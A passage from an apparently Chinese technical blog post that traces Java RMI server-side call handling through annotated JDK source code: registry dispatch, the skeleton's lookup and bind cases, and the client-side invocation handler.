class="line">                                checkAcceptPermission(acc);  <span class="comment">// 检查接受权限</span></span><br><span class="line">                                disp.dispatch(impl, call);  <span class="comment">// 调用分发器处理请求</span></span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;, acc);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (java.security.PrivilegedActionException pae) &#123;</span><br><span class="line">                    <span class="comment">// 处理特权操作异常</span></span><br><span class="line">                    <span class="keyword">throw</span> (IOException) pae.getException();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                setContextClassLoader(savedCcl);  <span class="comment">// 恢复原有的上下文类加载器</span></span><br><span class="line">                currentTransport.set(<span class="literal">null</span>);  <span class="comment">// 清除当前传输对象</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>该函数的主要逻辑是：</p>
<ol>
<li><p>首先该函数会先调用 <code>ObjID.read(call.getInputStream())</code> 获取对象 id，对于注册中心这里获取的 id 是 0。</p>
</li>
<li><p>之后调用 <code>ObjectTable.getTarget</code> 根据创建的 <code>ObjectEndpoint</code> 在 <code>ObjectTable</code> 中查询对应的 <code>target</code> 对象。这里的 <code>target</code> 对象是在前面导出注册中心的时候放入 <code>ObjectTable</code> 的。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Export the object so that it can accept incoming calls.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    target.setExportedTransport(<span class="built_in">this</span>); <span class="comment">// 设置 target.exportedTransport 为当前 TCPTransport 对象</span></span><br><span class="line">    ObjectTable.putTarget(target); <span class="comment">// 将 target 注册到 ObjectTable 中</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>通过 <code>getDispatcher</code> 方法获取 <code>target</code> 对象的远程对象引用 <code>disp</code>（实际上是 <code>UnicastServerRef</code>）。</p>
</li>
<li><p>调用 <code>UnicastServerRef#dispatch</code> 将方法调用分发给服务端的远程对象并序列化服务端调用返回的结果。</p>
</li>
</ol>
<p><code>dispatch</code> 函数首先读取操作数 <code>num</code>（即前面的 <code>opnum</code>），接着会会根据 <code>skel</code> 是否为空来区别 <code>RegistryImpl</code> 和 <code>UnicastRemoteObject</code>（即区别注册中心和普通远程对象）。对于注册中心 <code>dispatch</code> 函数会调用 <code>oldDispatch</code> 函数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 调度远程对象的方法（在服务器端）。在返回此方法之前，应处理</span></span><br><span class="line"><span class="comment"> * 服务器端的上行调用以及返回结果（或异常）的序列化。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj 调用的目标远程对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> call 远程调用对象，通过它可以获取操作和方法参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@exception</span> IOException 如果无法序列化返回结果或释放输入/输出流，抛出此异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote obj, RemoteCall call)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 在 1.1 版本存根中是正操作数；在 1.2 及以后版本的存根中是负版本号...</span></span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="type">long</span> op;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 读取远程调用头部</span></span><br><span class="line">        ObjectInput in;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取输入流</span></span><br><span class="line">            in = call.getInputStream();</span><br><span class="line">            num = in.readInt();  <span class="comment">// 读取操作编号</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception readEx) &#123;</span><br><span class="line">            <span class="comment">// 如果读取过程中发生异常，抛出 UnmarshalException</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling call header&quot;</span>, readEx);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果有骨架（Skeleton），使用它进行调用</span></span><br><span class="line">        <span class="keyword">if</span> (skel != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 使用旧的调度方法处理调用</span></span><br><span class="line">            oldDispatch(obj, call, num);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br></pre></td></tr></table></figure></div>

<p><code>oldDispatch</code> 会调用 <code>skel</code> 的 <code>dispatch</code> 方法。根据前面对注册中心创建过程中的 <code>objTable</code> 的值的分析可知，这里调用的是 <code>RegistryImpl_Skel#dispatch</code> 函数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用 RMI 1.1 存根/骨架协议处理服务器端的调度，</span></span><br><span class="line"><span class="comment"> * 给定一个非负的操作编号或已经从调用流中读取的负方法哈希值。</span></span><br><span class="line"><span class="comment"> * 异常由调用者处理，并发送到远程客户端。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj 调用的目标远程对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> call 远程调用对象，可以从中获取操作和方法参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> op 操作编号</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception 如果无法序列化返回结果或释放输入/输出流，抛出此异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">oldDispatch</span><span class="params">(Remote obj, RemoteCall call, <span class="type">int</span> op)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> hash;  <span class="comment">// 用于匹配存根与骨架的哈希值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取远程调用头部</span></span><br><span class="line">    ObjectInput in;</span><br><span class="line">    in = call.getInputStream();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 读取方法哈希值</span></span><br><span class="line">        hash = in.readLong();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ioe) &#123;</span><br><span class="line">        <span class="comment">// 如果读取错误，抛出 UnmarshalException 异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling call header&quot;</span>, ioe);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果正在记录调用日志，写出对象 ID 和操作编号</span></span><br><span class="line">    Operation[] operations = skel.getOperations();</span><br><span class="line">    logCall(obj, op &gt;= <span class="number">0</span> &amp;&amp; op &lt; operations.length ? operations[op] : <span class="string">&quot;op: &quot;</span> + op);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反序列化自定义调用数据</span></span><br><span class="line">    unmarshalCustomCallData(in);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调度到骨架处理远程对象</span></span><br><span class="line">    skel.dispatch(obj, call, op, hash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>RegistryImpl_Skel#dispatch</code> 会根据 <code>opnum</code> 进行不同的处理：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (opnum) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">// bind(String, Remote)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// list()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">// lookup(String)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>: <span class="comment">// rebind(String, Remote)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: <span class="comment">// unbind(String)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnmarshalException(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对于客户端的 <code>lookup</code> 调用代码逻辑如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>: <span class="comment">// lookup(String)</span></span><br><span class="line">&#123;</span><br><span class="line">    java.lang.String $param_String_1;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取远程调用的输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> (ObjectInputStream) call.getInputStream();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 读取字符串参数</span></span><br><span class="line">        $param_String_1 = SharedSecrets.getJavaObjectInputStreamReadString().readString(in);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException | IOException e) &#123;</span><br><span class="line">        <span class="comment">// 如果解码参数时出错，丢弃未完成的引用并抛出异常</span></span><br><span class="line">        call.discardPendingRefs();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnmarshalException(<span class="string">&quot;error unmarshalling arguments&quot;</span>, e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 释放输入流</span></span><br><span class="line">        call.releaseInputStream();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用远程方法 lookup，并获取结果</span></span><br><span class="line">    java.rmi.<span class="type">Remote</span> <span class="variable">$result</span> <span class="operator">=</span> server.lookup($param_String_1);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取远程调用的输出流，并写入返回结果</span></span><br><span class="line">        java.io.<span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getResultStream(<span class="literal">true</span>);</span><br><span class="line">        out.writeObject($result);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">        <span class="comment">// 如果返回结果的序列化过程中发生错误，抛出异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling return&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol>
<li><p>数据流中读取名称字符串 <code>$param_String_1</code>。</p>
</li>
<li><p>调用 <code>server.lookup</code> 查询对应的远程对象。这里 <code>server</code> 实际上就是 <code>RegistryImpl</code>，因此调用的是 <code>RegistryImpl#lookup</code> 并最终在 <code>bindings</code> 哈希表中查询对应的远程对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回注册表中指定名称的远程对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@exception</span> RemoteException 如果远程操作失败，抛出该异常。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@exception</span> NotBoundException 如果指定的名称当前未绑定，抛出该异常。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Remote <span class="title function_">lookup</span><span class="params">(String name)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException, NotBoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (bindings) &#123;</span><br><span class="line">        <span class="comment">// 从绑定表中获取指定名称的远程对象</span></span><br><span class="line">        <span class="type">Remote</span> <span class="variable">obj</span> <span class="operator">=</span> bindings.get(name);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果名称未绑定，抛出 NotBoundException</span></span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotBoundException</span>(name);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 返回找到的远程对象</span></span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>将查询到的远程对象序列化后写入输出流。</p>
</li>
</ol>
<p>对于服务端的 <code>bind</code> 调用代码逻辑如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0</span>: <span class="comment">// bind(String, Remote)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 在读取参数之前检查访问权限</span></span><br><span class="line">    RegistryImpl.checkAccess(<span class="string">&quot;Registry.bind&quot;</span>);</span><br><span class="line"></span><br><span class="line">    java.lang.String $param_String_1;</span><br><span class="line">    java.rmi.Remote $param_Remote_2;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取远程调用的输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> (ObjectInputStream) call.getInputStream();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 读取字符串参数（远程对象名称）</span></span><br><span class="line">        $param_String_1 = SharedSecrets.getJavaObjectInputStreamReadString().readString(in);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 读取远程对象（存根）</span></span><br><span class="line">        $param_Remote_2 = (java.rmi.Remote) in.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException | IOException | ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// 如果解码参数时出错，丢弃未完成的引用并抛出异常</span></span><br><span class="line">        call.discardPendingRefs();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnmarshalException(<span class="string">&quot;error unmarshalling arguments&quot;</span>, e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 释放输入流</span></span><br><span class="line">        call.releaseInputStream();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用远程对象的 bind 方法，将远程对象与名称绑定</span></span><br><span class="line">    server.bind($param_String_1, $param_Remote_2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取远程调用的输出流并进行结果序列化</span></span><br><span class="line">        call.getResultStream(<span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">        <span class="comment">// 如果返回结果的序列化过程中发生错误，抛出异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling return&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol>
<li><p>从输入流反序列化得到远程对象及其名称。</p>
</li>
<li><p>调用 <code>RegistryImpl#bind</code> 方法将远程对象名称与远程对象作为键值对存入哈希表 <code>bindings</code> 中。 </p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将指定的名称绑定到远程对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> name 要绑定的名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj 要绑定的远程对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException 如果远程操作失败</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> AlreadyBoundException 如果名称已经被绑定</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> AccessException 如果没有访问权限</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(String name, Remote obj)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException, AlreadyBoundException, AccessException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 访问检查已经在骨架中完成，对于本地访问没有影响</span></span><br><span class="line">    <span class="keyword">synchronized</span> (bindings) &#123;</span><br><span class="line">        <span class="comment">// 查找当前名称是否已经绑定了远程对象</span></span><br><span class="line">        <span class="type">Remote</span> <span class="variable">curr</span> <span class="operator">=</span> bindings.get(name);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果已经绑定，抛出 AlreadyBoundException</span></span><br><span class="line">        <span class="keyword">if</span> (curr != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AlreadyBoundException</span>(name);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果没有绑定，将名称和远程对象绑定</span></span><br><span class="line">        bindings.put(name, obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<h3 id="服务调用"><a href="#服务调用" class="headerlink" title="服务调用"></a>服务调用</h3><p>服务调用即客户端调用远程对象的方法的过程，期间还会传递参数和返回值：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> (Hello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">System.out.println(hello.sayHello(<span class="string">&quot;sky123&quot;</span>));</span><br></pre></td></tr></table></figure></div>

<h4 id="客户端部分"><a href="#客户端部分" class="headerlink" title="客户端部分"></a>客户端部分</h4><p>根据前面的分析我们知道，客户端从注册中心查询到的服务实际上是远程对象的存根（<code>Stub</code>，即远程对象的动态代理）。因此当我们在客户端调用远程对象的方法实际上会被代理类转发到 <code>InvocationHandler</code> 的 <code>invoke</code> 方法上。又因为根据前面对远程对象创建过程的分析可知，创建远程对象的代理类时使用的 <code>InvocationHandler</code> 实际上是 <code>RemoteObjectInvocationHandler</code>，对应的 <code>invoke</code> 方法如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">        <span class="keyword">throws</span> Throwable</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 检查 proxy 是否为代理类</span></span><br><span class="line">    <span class="keyword">if</span> (! Proxy.isProxyClass(proxy.getClass())) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;not a proxy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查代理实例的调用处理器是否为当前处理器</span></span><br><span class="line">    <span class="keyword">if</span> (Proxy.getInvocationHandler(proxy) != <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;handler mismatch&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理 Object 类的方法（如 hashCode、equals、toString）</span></span><br><span class="line">    <span class="keyword">if</span> (method.getDeclaringClass() == Object.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> invokeObjectMethod(proxy, method, args);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// 特别处理 finalize 方法</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;finalize&quot;</span>.equals(method.getName()) &amp;&amp; method.getParameterCount() == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        !allowFinalizeInvocation) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 忽略 finalize 方法</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// 进行远程方法调用</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> invokeRemoteMethod(proxy, method, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个函数的主要逻辑为：</p>
<ul>
<li>如果调用的是 <code>Object</code> 声明的方法（如 <code>getClass</code>，<code>hashCode</code>，<code>equals</code> 之类的），则接调用 <code>invokeObjectMethod</code> 方法进行处理。</li>
<li>若调用的是远程对象自己的方法，接调用 <code>invokeRemoteMethod</code> 函数执行远程方法调用。</li>
</ul>
<p><code>invokeRemoteMethod</code> 函数实际是委托 <code>RemoteRef</code> 的子类的 <code>UnicastRef#invoke</code> 方法来执行。这里 <code>UnicastRef#invoke</code> 传入的 <code>getMethodHash(method)</code> 参数是方法的哈希值，后面服务端会根据这个哈希值找到相应的方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理远程方法调用。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">invokeRemoteMethod</span><span class="params">(Object proxy,</span></span><br><span class="line"><span class="params">                                  Method method,</span></span><br><span class="line"><span class="params">                                  Object[] args)</span></span><br><span class="line">        <span 